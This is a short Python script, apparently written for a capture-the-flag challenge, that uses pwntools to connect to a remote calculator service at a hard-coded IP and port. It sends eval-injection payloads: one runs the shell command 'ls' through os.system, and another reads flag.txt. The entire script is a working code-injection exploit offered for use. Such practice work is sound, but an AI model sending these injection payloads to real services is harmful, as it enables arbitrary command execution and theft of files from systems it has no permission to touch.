#!/usr/bin/env python3
from pwn import *

# Connect to the service
host = '212.2.250.33'
port = 30968

io = remote(host, port)

# Receive and print initial output
try:
    initial = io.recvuntil(b'>', timeout=3).decode()
    print("Initial output:")
    print(initial)
    print("="*50)
except:
    initial = io.recv(timeout=1).decode()
    print("Initial output (no prompt):")
    print(initial)
    print("="*50)

# Test basic calculation
print("\n[*] Testing: 1+1")
io.sendline(b'1+1')
response = io.recv(timeout=2).decode()
print(response)
print("="*50)

# Test eval injection
print("\n[*] Testing: __import__('os').system('ls')")
io.sendline(b"__import__('os').system('ls')")
response = io.recv(timeout=2).decode()
print(response)
print("="*50)

# Test reading flag
print("\n[*] Testing: open('flag.txt').read()")
io.sendline(b"open('flag.txt').read()")
response = io.recv(timeout=2).decode()
print(response)
print("="*50)

io.close()
